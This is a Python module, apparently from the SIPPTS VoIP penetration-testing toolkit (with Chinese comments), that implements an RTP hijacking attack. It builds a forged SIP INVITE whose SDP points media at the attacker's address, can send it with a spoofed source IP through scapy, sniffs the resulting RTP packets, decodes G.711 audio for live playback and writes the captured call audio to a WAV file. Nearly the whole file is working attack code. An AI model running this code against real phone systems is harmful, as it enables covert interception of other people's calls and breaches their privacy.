#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import sys
import ssl
import threading
import time
import wave
import os
import re
import struct
import io
from datetime import datetime
from scapy.all import IP, UDP, Raw, send, sniff
from scapy.arch import get_windows_if_list  # Windows系统
from scapy.arch import get_if_list          # Linux系统
try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False
    print("警告: PyAudio未安装，将无法实时播放音频。可以使用pip install PyAudio安装。")
from .lib.functions import (
    create_message,
    get_free_port,
    parse_message,
    parse_digest,
    generate_random_string,
    calculateHash,
    get_machine_default_ip,
    extract_rtp_info,
)
from .lib.color import Color
from .lib.logos import Logo

# RTP负载类型定义
RTP_PAYLOAD_TYPES = {
    "0 PCMU (audio)": 0,
    "3 GSM (audio)": 3,
    "4 G723 (audio)": 4,
    "5 DVI4 (audio)": 5,
    "6 DVI4 (audio)": 6,
    "7 LPC (audio)": 7,
    "8 PCMA (audio)": 8,
    "9 G722 (audio)": 9,
    "10 L16 (audio)": 10,
    "11 L16 (audio)": 11,
    "12 QCELP (audio)": 12,
    "13 CN (audio)": 13,
    "14 MPA (audio)": 14,
    "15 G728 (audio)": 15,
    "16 DVI4 (audio)": 16,
    "17 DVI4 (audio)": 17,
    "18 G729 (audio)": 18,
    "25 CELLB (video)": 25,
    "26 JPEG (video)": 26,
    "28 nv (video)": 28,
    "31 H261 (video)": 31,
    "32 MPV (video)": 32,
    "33 MP2T (audio/video)": 33,
    "34 H263 (video)": 34
}

class RTPHijack:
    def __init__(self):
        # SIP相关设置
        self.ip = ""  # 目标SIP服务器IP
        self.host = ""
        self.rport = "5060"  # SIP服务器端口
        self.lport = ""  # 本地SIP端口
        self.proto = "UDP"  # SIP协议
        self.domain = ""
        self.contact_domain = ""
        self.from_user = "100"
        self.from_name = ""
        self.from_domain = ""
        self.from_tag = ""
        self.to_user = "100"
        self.to_name = ""
        self.to_domain = ""
        self.to_tag = ""
        self.user_agent = "pplsip"
        self.localip = ""
        self.spoof_ip = ""  # 伪造的源IP地址
        
        # RTP相关设置
        self.rtp_target_ip = ""  # 目标RTP IP地址（从SDP中获取）
        self.rtp_target_port = 0  # 目标RTP端口（从SDP中获取）
        self.rtp_local_port = 10000  # 本地接收RTP的端口
        self.rtp_payload_type = "0 PCMU (audio)"  # 默认使用PCMU
        self.audio_file = "hijacked_audio.wav"  # 保存的音频文件
        
        # 会话相关设置
        self.verbose = 0
        self.timeout = 60  # 默认劫持60秒
        self.call_id = ""  # 呼叫ID
        self.ofile = ""
        
        # 控制标志
        self.use_scapy = False
        self.stop_sniffing = False
        self.rtp_running = False
        self.captured_packets = []  # 捕获的RTP包
        
        # 实时音频播放相关
        self.enable_live_playback = PYAUDIO_AVAILABLE  # 是否启用实时播放
        self.audio_stream = None  # PyAudio流
        self.pyaudio_instance = None  # PyAudio实例
        self.audio_buffer = []  # 音频缓冲区
        self.audio_buffer_lock = threading.Lock()  # 用于同步访问音频缓冲区
        
        self.c = Color()

    def start(self):
        """启动RTP劫持功能"""
        # 验证参数
        if self.ip == "":
            print(f"{self.c.BRED}错误: 目标IP不能为空")
            print(self.c.WHITE)
            sys.exit(1)
        
        if self.proto not in ["UDP", "TCP", "TLS"]:
            print(f"{self.c.BRED}错误: 不支持的协议 {self.proto}")
            print(self.c.WHITE)
            sys.exit(1)
        
        # 如果使用IP欺骗，强制使用UDP协议
        if self.spoof_ip and self.spoof_ip != "":
            self.use_scapy = True
            print(f"{self.c.BWHITE}[✓] 使用IP欺骗: {self.c.GREEN}{self.spoof_ip}")
            if self.proto != "UDP":
                print(f"{self.c.BRED}IP欺骗仅适用于UDP协议，切换到UDP。")
                self.proto = "UDP"
        
        # 获取本地IP
        local_ip = self.localip
        if self.localip == "":
            try:
                local_ip = get_machine_default_ip()
                self.localip = local_ip
            except:
                print(f"{self.c.BRED}错误: 无法获取本地IP")
                print(f"{self.c.BWHITE}请使用 {self.c.BYELLOW}-local-ip{self.c.BWHITE} 参数")
                print(self.c.WHITE)
                sys.exit(1)
        
        # 显示劫持信息
        # logo = Logo("hijack")
        # logo.print()
        
        print(f"{self.c.BWHITE}[✓] 目标SIP服务器: {self.c.GREEN}{self.ip}{self.c.WHITE}:{self.c.GREEN}{self.rport}{self.c.WHITE}/{self.c.GREEN}{self.proto}")
        if self.from_user != "100":
            print(f"{self.c.BWHITE}[✓] From用户: {self.c.GREEN}{self.from_user}")
        if self.to_user != "100":
            print(f"{self.c.BWHITE}[✓] To用户: {self.c.GREEN}{self.to_user}")
        print(f"{self.c.BWHITE}[✓] 本地IP: {self.c.GREEN}{self.localip}")
        print(f"{self.c.BWHITE}[✓] RTP负载类型: {self.c.GREEN}{self.rtp_payload_type}")
        print(f"{self.c.BWHITE}[✓] 音频文件保存位置: {self.c.GREEN}{self.audio_file}")
        print(f"{self.c.BWHITE}[✓] 劫持时长: {self.c.GREEN}{self.timeout}秒")
        if self.enable_live_playback:
            print(f"{self.c.BWHITE}[✓] 实时音频播放: {self.c.GREEN}已启用")
        else:
            print(f"{self.c.BWHITE}[✓] 实时音频播放: {self.c.BRED}未启用 (需要PyAudio)")
        print(self.c.WHITE)
        
        # 初始化音频播放（如果启用）
        if self.enable_live_playback:
            self.init_audio_playback()
        
        # 创建socket或使用scapy
        if not self.use_scapy:
            try:
                if self.proto == "UDP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error:
                print(f"{self.c.RED}创建socket失败")
                print(self.c.WHITE)
                sys.exit(1)
        
        # 绑定本地端口
        bind = "0.0.0.0"
        if self.lport == "" or self.lport == None:
            lport = get_free_port()
        else:
            lport = int(self.lport)
        
        # 如果不使用scapy，则绑定socket
        if not self.use_scapy:
            try:
                sock.bind((bind, lport))
            except:
                lport = get_free_port()
                sock.bind((bind, lport))
        
        # 设置目标地址
        if self.domain == "":
            self.domain = self.ip
        if not self.from_domain or self.from_domain == "":
            self.from_domain = self.domain
        if not self.to_domain or self.to_domain == "":
            self.to_domain = self.domain
        if self.contact_domain == "":
            self.contact_domain = local_ip
        
        # 设置随机参数
        if self.call_id == "":
            self.call_id = generate_random_string(32, 32, "hex")
        branch = generate_random_string(71, 71, "ascii")
        if not self.from_tag:
            self.from_tag = generate_random_string(8, 8, "hex")
        
        # 开始劫持流程
        try:
            host = (str(self.ip), int(self.rport))
            
            # 创建和发送SIP INVITE请求
            print(f"{self.c.BYELLOW}[*] 发送伪造的INVITE消息劫持通话...")
            
            # 创建INVITE消息（使用固定的SDP将RTP引导到我们的地址）
            msg = self.create_hijack_invite_message(
                self.localip,
                lport,
                branch,
                self.call_id,
                self.from_tag
            )
            
            # 首先启动RTP捕获线程，确保在发送INVITE前就准备好接收RTP包
            print(f"{self.c.BWHITE}[*] 启动RTP捕获（端口: {self.rtp_local_port}）...")
            self.rtp_running = True
            self.captured_packets = []
            
            rtp_thread = threading.Thread(target=self.capture_rtp)
            rtp_thread.daemon = True
            rtp_thread.start()
            
            # 等待一秒确保RTP捕获线程已启动
            time.sleep(1)
            
            # 然后发送INVITE消息
            if self.use_scapy:
                self.send_with_scapy(msg, host, lport)
            else:
                sock.settimeout(10)
                
                if self.proto == "TCP":
                    sock.connect(host)
                    
                if self.proto == "TLS":
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    context.load_default_certs()
                    
                    sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
                    sock_ssl.connect(host)
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)
            
            # 处理响应（同时RTP捕获正在进行）
            response_received = False
            to_tag = ""
            via = ""
            
            # 等待SIP服务器响应
            try:
                if not self.use_scapy:
                    rescode = "100"
                    while rescode[:1] == "1":
                        if self.proto == "TLS":
                            resp = sock_ssl.recv(4096)
                        else:
                            resp = sock.recv(4096)
                        
                        headers = parse_message(resp.decode())
                        
                        if headers:
                            via = headers["via"]
                            response = f"{headers['response_code']} {headers['response_text']}"
                            rescode = headers["response_code"]
                            
                            if self.verbose == 1:
                                print(f"{self.c.BWHITE}[-] 收到来自 {self.ip}:{self.rport}/{self.proto} 的响应...")
                                print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")
                            else:
                                print(f"{self.c.BGREEN}[<=] 响应: {response}")
                            
                            to_tag = headers["totag"]
                            response_received = True
                            
                            # 从SDP中提取RTP信息（仅用于记录目标RTP地址）
                            sdp_info = extract_rtp_info(resp.decode())
                            if sdp_info:
                                self.rtp_target_ip = sdp_info.get("ip", "")
                                self.rtp_target_port = int(sdp_info.get("port", 0))
                                print(f"{self.c.BWHITE}[✓] 从SDP中提取RTP信息: {self.c.GREEN}{self.rtp_target_ip}:{self.rtp_target_port}")
                    
                    # 如果收到200 OK，发送ACK
                    if headers["response_code"] == "200":
                        # 发送ACK
                        ack_msg = create_message(
                            "ACK",
                            self.localip,
                            self.contact_domain,
                            self.from_user,
                            self.from_name,
                            self.from_domain,
                            self.to_user,
                            self.to_name,
                            self.to_domain,
                            self.proto,
                            self.domain,
                            self.user_agent,
                            lport,
                            branch,
                            self.call_id,
                            self.from_tag,
                            "1",
                            to_tag,
                            "",
                            1,
                            "",
                            0,
                            via,
                            "",
                            "",
                            "",
                            "",
                            1,
                        )
                        
                        print(f"{self.c.BYELLOW}[=>] 发送 ACK")
                        
                        if self.proto == "TLS":
                            sock_ssl.sendall(bytes(ack_msg[:8192], "utf-8"))
                        else:
                            sock.sendto(bytes(ack_msg[:8192], "utf-8"), host)
                
            except socket.timeout:
                print(f"{self.c.BRED}等待SIP响应超时，继续捕获RTP...")
            
            # 等待指定的超时时间，或直到手动停止
            print(f"{self.c.BWHITE}[*] RTP劫持将持续 {self.timeout} 秒...")
            
            timeout_counter = 0
            while timeout_counter < self.timeout and self.rtp_running:
                time.sleep(1)
                timeout_counter += 1
                if timeout_counter % 5 == 0:
                    print(f"{self.c.BWHITE}[*] 已捕获 {len(self.captured_packets)} 个RTP包，剩余 {self.timeout - timeout_counter} 秒...")
            
            # 停止RTP捕获
            self.rtp_running = False
            print(f"{self.c.BWHITE}[*] RTP捕获结束，共捕获 {len(self.captured_packets)} 个RTP包")
            
            # 处理捕获的音频
            self.process_captured_audio()
            
        except Exception as e:
            print(f"{self.c.RED}[!] 错误: {str(e)}\n{self.c.WHITE}")
            import traceback
            traceback.print_exc()
        finally:
            # 清理资源
            if not self.use_scapy and 'sock' in locals():
                sock.close()
            
            # 停止所有线程
            self.stop_sniffing = True
            self.rtp_running = False
            time.sleep(1)
        
        print(f"{self.c.BWHITE}[*] RTP劫持已完成")

    def create_hijack_invite_message(self, local_ip, local_port, branch, call_id, from_tag):
        """创建用于劫持的SIP INVITE消息，使用标准的create_message函数"""
        # 使用RTP负载类型ID
        payload_id = RTP_PAYLOAD_TYPES.get(self.rtp_payload_type, 0)
        
        # 设置RTP端口
        rtp_port = self.rtp_local_port if self.rtp_local_port else get_free_port()
        self.rtp_local_port = rtp_port
        
        # 创建自定义SDP
        custom_sdp = f"""v=0
        o=pplsip {int(time.time())} {int(time.time())} IN IP4 {local_ip}
        s=SIP Call
        c=IN IP4 {local_ip}
        t=0 0
        m=audio {rtp_port} RTP/AVP {payload_id}
        a=rtpmap:{payload_id} PCMU/8000
        a=sendrecv
        """
        
        # 使用create_message函数创建标准SIP消息
        msg = create_message(
            "INVITE",
            local_ip,              # ip_sdp
            self.contact_domain,   # contactdomain
            self.from_user,        # fromuser
            self.from_name,        # fromname
            self.from_domain,      # fromdomain
            self.to_user,          # touser
            self.to_name,          # toname
            self.to_domain,        # todomain
            self.proto,            # proto
            self.domain,           # domain
            self.user_agent,       # useragent
            local_port,            # fromport
            branch,                # branch
            call_id,               # callid
            from_tag,              # tag
            "1",                   # cseq
            self.to_tag,           # totag
            "",                    # digest
            1,                     # auth_type
            "",                    # referto
            0,                     # withsdp (我们将手动添加SDP)
            "",                    # via
            "",                    # rr
            "",                    # ppi
            "",                    # pai
            "",                    # header
            1,                     # withcontact
        )
        
        # 手动替换Content-Type和添加自定义SDP
        msg = msg.replace("Content-Length: 0", f"Content-Type: application/sdp\r\nContent-Length: {len(custom_sdp)}")
        msg += custom_sdp
        
        return msg
    
    def hijack_rtp(self):
        """启动RTP劫持，捕获和处理RTP流量"""
        try:
            # 创建RTP接收线程
            self.rtp_running = True
            self.captured_packets = []
            
            rtp_thread = threading.Thread(target=self.capture_rtp)
            rtp_thread.daemon = True
            rtp_thread.start()
            
            # 等待指定的超时时间，或直到手动停止
            print(f"{self.c.BWHITE}[*] RTP劫持将持续 {self.timeout} 秒...")
            
            timeout_counter = 0
            while timeout_counter < self.timeout and self.rtp_running:
                time.sleep(1)
                timeout_counter += 1
                if timeout_counter % 5 == 0:
                    print(f"{self.c.BWHITE}[*] 已捕获 {len(self.captured_packets)} 个RTP包，剩余 {self.timeout - timeout_counter} 秒...")
            
            # 停止RTP捕获
            self.rtp_running = False
            print(f"{self.c.BWHITE}[*] RTP捕获结束，共捕获 {len(self.captured_packets)} 个RTP包")
            
            # 处理捕获的音频
            self.process_captured_audio()
            
        except Exception as e:
            print(f"{self.c.RED}[!] RTP劫持错误: {str(e)}{self.c.WHITE}")
    
    def capture_rtp(self):
        """使用scapy捕获指定端口的RTP流量"""
        try:
            # 获取活跃网络接口
            if sys.platform == "win32":
                interfaces = get_windows_if_list()
                # 选择第一个活跃的接口
                for iface in interfaces:
                    if iface.get('name').startswith('以太网') or iface.get('name').startswith('Ethernet'):
                        active_iface = iface.get('name')
                        break
                else:
                    active_iface = None
            else:
                # Linux系统
                interfaces = get_if_list()
                active_iface = interfaces[0] if interfaces else None
            
            if not active_iface:
                print(f"{self.c.RED}[!] 无法找到活跃的网络接口{self.c.WHITE}")
                return
            
            print(f"{self.c.BWHITE}[+] 使用网络接口: {active_iface}")
            
            # BPF过滤器，捕获发往目标端口的UDP流量
            filter_str = f"udp and dst port {self.rtp_local_port}"
            
            # 启动嗅探
            print(f"{self.c.BWHITE}[+] 开始捕获端口 {self.rtp_local_port} 的RTP流量...")
            
            sniff(
                filter=filter_str,
                prn=self.process_rtp_packet,
                store=0,
                iface=active_iface,
                stop_filter=lambda x: not self.rtp_running
            )
            
        except Exception as e:
            print(f"{self.c.RED}[!] RTP捕获错误: {str(e)}{self.c.WHITE}")
    
    def process_rtp_packet(self, pkt):
        """处理捕获的RTP包"""
        try:
            if pkt.haslayer(UDP) and pkt.haslayer(Raw):
                # 提取RTP负载
                raw_payload = bytes(pkt[Raw])
                
                # 验证这是否是有效的RTP包（简单验证）
                if len(raw_payload) >= 12 and (raw_payload[0] & 0xC0) == 0x80:  # RTP版本2
                    # 提取RTP头部信息
                    rtp_header = raw_payload[:12]
                    payload_type = raw_payload[1] & 0x7F
                    sequence = (raw_payload[2] << 8) | raw_payload[3]
                    timestamp = struct.unpack('>I', raw_payload[4:8])[0]
                    ssrc = struct.unpack('>I', raw_payload[8:12])[0]
                    
                    # 提取音频数据
                    audio_data = raw_payload[12:]
                    
                    # 保存包信息
                    packet_info = {
                        'sequence': sequence,
                        'timestamp': timestamp,
                        'ssrc': ssrc,
                        'payload_type': payload_type,
                        'audio_data': audio_data
                    }
                    
                    self.captured_packets.append(packet_info)
                    
                    # 实时处理音频数据进行播放
                    if self.enable_live_playback and self.audio_stream:
                        pcm_data = None
                        
                        # 将编码的音频数据转换为PCM格式
                        if payload_type == 0:  # PCMU
                            pcm_data = self.ulaw2linear(audio_data)
                        elif payload_type == 8:  # PCMA
                            pcm_data = self.alaw2linear(audio_data)
                        
                        # 如果成功转换了数据，将其添加到播放缓冲区
                        if pcm_data:
                            with self.audio_buffer_lock:
                                self.audio_buffer.append(pcm_data)
                    
                    if len(self.captured_packets) % 50 == 0:
                        print(f"{self.c.BWHITE}[+] 已捕获 {len(self.captured_packets)} 个RTP包")
        
        except Exception as e:
            print(f"{self.c.RED}[!] 处理RTP包错误: {str(e)}{self.c.WHITE}")
    
    def init_audio_playback(self):
        """初始化音频播放"""
        if not PYAUDIO_AVAILABLE:
            self.enable_live_playback = False
            return
            
        try:
            # 初始化PyAudio
            self.pyaudio_instance = pyaudio.PyAudio()
            
            # 默认采样率和声道
            sample_rate = 8000  # 适用于G.711 (PCMU/PCMA)
            channels = 1  # 单声道
            
            # 创建回调函数，负责从缓冲区获取音频数据并发送到音频设备
            def audio_callback(in_data, frame_count, time_info, status):
                # 需要返回的数据量（字节数）
                bytes_needed = frame_count * 2  # 16位PCM = 2字节/采样
                output_data = bytearray()
                
                with self.audio_buffer_lock:
                    while len(output_data) < bytes_needed and self.audio_buffer:
                        buffer = self.audio_buffer.pop(0)
                        output_data.extend(buffer)
                
                # 如果没有足够的数据，用静音填充
                if len(output_data) < bytes_needed:
                    output_data.extend(b'\x00' * (bytes_needed - len(output_data)))
                
                # 确保只返回需要的数据量
                return bytes(output_data[:bytes_needed]), pyaudio.paContinue
            
            # 打开音频流
            self.audio_stream = self.pyaudio_instance.open(
                format=pyaudio.paInt16,
                channels=channels,
                rate=sample_rate,
                output=True,
                frames_per_buffer=160,  # G.711每包通常20ms @8kHz = 160个采样点
                stream_callback=audio_callback
            )
            
            # 启动音频流
            self.audio_stream.start_stream()
            
            print(f"{self.c.BGREEN}[✓] 实时音频播放已启动")
            
        except Exception as e:
            print(f"{self.c.RED}[!] 初始化音频播放失败: {str(e)}{self.c.WHITE}")
            self.enable_live_playback = False
            
            # 清理资源
            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_stream = None
            
            if self.pyaudio_instance:
                self.pyaudio_instance.terminate()
                self.pyaudio_instance = None
    
    def stop_audio_playback(self):
        """停止音频播放并释放资源"""
        if self.audio_stream:
            try:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_stream = None
                print(f"{self.c.BWHITE}[*] 实时音频播放已停止")
            except Exception as e:
                print(f"{self.c.RED}[!] 停止音频播放时出错: {str(e)}{self.c.WHITE}")
        
        if self.pyaudio_instance:
            try:
                self.pyaudio_instance.terminate()
                self.pyaudio_instance = None
            except:
                pass
        
        # 清空音频缓冲区
        with self.audio_buffer_lock:
            self.audio_buffer.clear()
    
    def process_captured_audio(self):
        """处理捕获的音频数据并保存为WAV文件"""
        try:
            if not self.captured_packets:
                print(f"{self.c.BRED}未捕获到任何RTP包")
                return
            
            # 对数据包按序列号排序
            self.captured_packets.sort(key=lambda x: x['sequence'])
            
            # 根据负载类型确定采样率和声道
            sample_rate = 8000  # 默认采样率（PCMU/PCMA）
            channels = 1  # 单声道
            
            # 提取第一个包的负载类型
            payload_type = self.captured_packets[0]['payload_type'] if self.captured_packets else 0
            
            # 创建WAV文件
            with wave.open(self.audio_file, 'wb') as wav_file:
                wav_file.setnchannels(channels)
                wav_file.setsampwidth(2)  # 16位采样
                wav_file.setframerate(sample_rate)
                
                # 合并所有音频数据
                all_audio = bytearray()
                
                # 写入音频数据
                for packet in self.captured_packets:
                    audio_data = packet['audio_data']
                    
                    # 如果是PCMU (G.711 μ-law)，需要转换为PCM
                    if payload_type == 0:  # PCMU
                        pcm_data = self.ulaw2linear(audio_data)
                        all_audio.extend(pcm_data)
                    # 如果是PCMA (G.711 A-law)
                    elif payload_type == 8:  # PCMA
                        pcm_data = self.alaw2linear(audio_data)
                        all_audio.extend(pcm_data)
                    else:
                        # 对于其他类型的负载，直接添加原始数据
                        all_audio.extend(audio_data)
                
                # 写入所有音频数据
                wav_file.writeframes(all_audio)
            
            print(f"{self.c.BGREEN}[✓] 音频已保存到文件: {self.audio_file}")
            print(f"{self.c.BWHITE}    - 总RTP包数: {len(self.captured_packets)}")
            print(f"{self.c.BWHITE}    - 总音频长度: {len(self.captured_packets) / 50:.2f} 秒（估计值）")
            
        except Exception as e:
            print(f"{self.c.RED}[!] 处理音频数据错误: {str(e)}{self.c.WHITE}")
            import traceback
            traceback.print_exc()
    
    def ulaw2linear(self, ulaw_data):
        """
        将G.711 μ-law编码数据转换为线性PCM
        """
        result = bytearray()
        ulaw_expand = [
            -32124, -31100, -30076, -29052, -28028, -27004, -25980, -24956,
            -23932, -22908, -21884, -20860, -19836, -18812, -17788, -16764,
            -15996, -15484, -14972, -14460, -13948, -13436, -12924, -12412,
            -11900, -11388, -10876, -10364, -9852, -9340, -8828, -8316,
            -7932, -7676, -7420, -7164, -6908, -6652, -6396, -6140,
            -5884, -5628, -5372, -5116, -4860, -4604, -4348, -4092,
            -3900, -3772, -3644, -3516, -3388, -3260, -3132, -3004,
            -2876, -2748, -2620, -2492, -2364, -2236, -2108, -1980,
            -1884, -1820, -1756, -1692, -1628, -1564, -1500, -1436,
            -1372, -1308, -1244, -1180, -1116, -1052, -988, -924,
            -876, -844, -812, -780, -748, -716, -684, -652,
            -620, -588, -556, -524, -492, -460, -428, -396,
            -372, -356, -340, -324, -308, -292, -276, -260,
            -244, -228, -212, -196, -180, -164, -148, -132,
            -120, -112, -104, -96, -88, -80, -72, -64,
            -56, -48, -40, -32, -24, -16, -8, 0,
            32124, 31100, 30076, 29052, 28028, 27004, 25980, 24956,
            23932, 22908, 21884, 20860, 19836, 18812, 17788, 16764,
            15996, 15484, 14972, 14460, 13948, 13436, 12924, 12412,
            11900, 11388, 10876, 10364, 9852, 9340, 8828, 8316,
            7932, 7676, 7420, 7164, 6908, 6652, 6396, 6140,
            5884, 5628, 5372, 5116, 4860, 4604, 4348, 4092,
            3900, 3772, 3644, 3516, 3388, 3260, 3132, 3004,
            2876, 2748, 2620, 2492, 2364, 2236, 2108, 1980,
            1884, 1820, 1756, 1692, 1628, 1564, 1500, 1436,
            1372, 1308, 1244, 1180, 1116, 1052, 988, 924,
            876, 844, 812, 780, 748, 716, 684, 652,
            620, 588, 556, 524, 492, 460, 428, 396,
            372, 356, 340, 324, 308, 292, 276, 260,
            244, 228, 212, 196, 180, 164, 148, 132,
            120, 112, 104, 96, 88, 80, 72, 64,
            56, 48, 40, 32, 24, 16, 8, 0
        ]
        
        for byte in ulaw_data:
            # 反转位
            byte = ~byte & 0xFF
            # 获取扩展值
            sample = ulaw_expand[byte]
            # 将16位有符号整数转换为两个字节（小端序）
            result.extend(struct.pack('<h', sample))
        
        return result
    
    def alaw2linear(self, alaw_data):
        """
        将G.711 A-law编码数据转换为线性PCM
        """
        result = bytearray()
        alaw_expand = [
            -5504, -5248, -6016, -5760, -4480, -4224, -4992, -4736,
            -7552, -7296, -8064, -7808, -6528, -6272, -7040, -6784,
            -2752, -2624, -3008, -2880, -2240, -2112, -2496, -2368,
            -3776, -3648, -4032, -3904, -3264, -3136, -3520, -3392,
            -22016, -20992, -24064, -23040, -17920, -16896, -19968, -18944,
            -30208, -29184, -32256, -31232, -26112, -25088, -28160, -27136,
            -11008, -10496, -12032, -11520, -8960, -8448, -9984, -9472,
            -15104, -14592, -16128, -15616, -13056, -12544, -14080, -13568,
            -344, -328, -376, -360, -280, -264, -312, -296,
            -472, -456, -504, -488, -408, -392, -440, -424,
            -88, -72, -120, -104, -24, -8, -56, -40,
            -216, -200, -248, -232, -152, -136, -184, -168,
            -1376, -1312, -1504, -1440, -1120, -1056, -1248, -1184,
            -1888, -1824, -2016, -1952, -1632, -1568, -1760, -1696,
            -688, -656, -752, -720, -560, -528, -624, -592,
            -944, -912, -1008, -976, -816, -784, -880, -848,
            5504, 5248, 6016, 5760, 4480, 4224, 4992, 4736,
            7552, 7296, 8064, 7808, 6528, 6272, 7040, 6784,
            2752, 2624, 3008, 2880, 2240, 2112, 2496, 2368,
            3776, 3648, 4032, 3904, 3264, 3136, 3520, 3392,
            22016, 20992, 24064, 23040, 17920, 16896, 19968, 18944,
            30208, 29184, 32256, 31232, 26112, 25088, 28160, 27136,
            11008, 10496, 12032, 11520, 8960, 8448, 9984, 9472,
            15104, 14592, 16128, 15616, 13056, 12544, 14080, 13568,
            344, 328, 376, 360, 280, 264, 312, 296,
            472, 456, 504, 488, 408, 392, 440, 424,
            88, 72, 120, 104, 24, 8, 56, 40,
            216, 200, 248, 232, 152, 136, 184, 168,
            1376, 1312, 1504, 1440, 1120, 1056, 1248, 1184,
            1888, 1824, 2016, 1952, 1632, 1568, 1760, 1696,
            688, 656, 752, 720, 560, 528, 624, 592,
            944, 912, 1008, 976, 816, 784, 880, 848
        ]
        
        for byte in alaw_data:
            # 反转最高位
            byte ^= 0x55
            # 获取扩展值
            sample = alaw_expand[byte & 0xFF]
            # 将16位有符号整数转换为两个字节（小端序）
            result.extend(struct.pack('<h', sample))
        
        return result
    
    def send_with_scapy(self, msg, host, lport, method_suffix=""):
        """使用scapy发送带有伪造源IP的SIP消息"""
        target_ip = host[0]
        target_port = host[1]
        source_ip = self.spoof_ip if self.spoof_ip else self.localip
        
        # 构造和发送数据包
        packet = IP(src=source_ip, dst=target_ip) / \
                UDP(sport=lport, dport=target_port) / \
                Raw(load=msg)
        
        # 发送数据包
        send(packet, verbose=0)
        
        if self.verbose == 1:
            print(
                f"{self.c.BWHITE}[+] 发送到 {target_ip}:{target_port}/UDP，伪造源IP {source_ip} ..."
            )
            print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
        else:
            if method_suffix:
                print(f"{self.c.BYELLOW}[=>] 请求 {method_suffix}")
            else:
                method_match = re.search(r'^([A-Z]+) ', msg.split("\n")[0])
                if method_match:
                    print(f"{self.c.BYELLOW}[=>] 请求 {method_match.group(1)}")
    
    def stop(self):
        """停止所有活动"""
        self.rtp_running = False
        self.stop_sniffing = True
        print(f"{self.c.BYELLOW}\n您按下了Ctrl+C!")
        print(f"{self.c.BWHITE}[*] 正在停止RTP劫持...")
        
        # 停止音频播放
        if self.enable_live_playback:
            self.stop_audio_playback()
            
        print(self.c.WHITE)
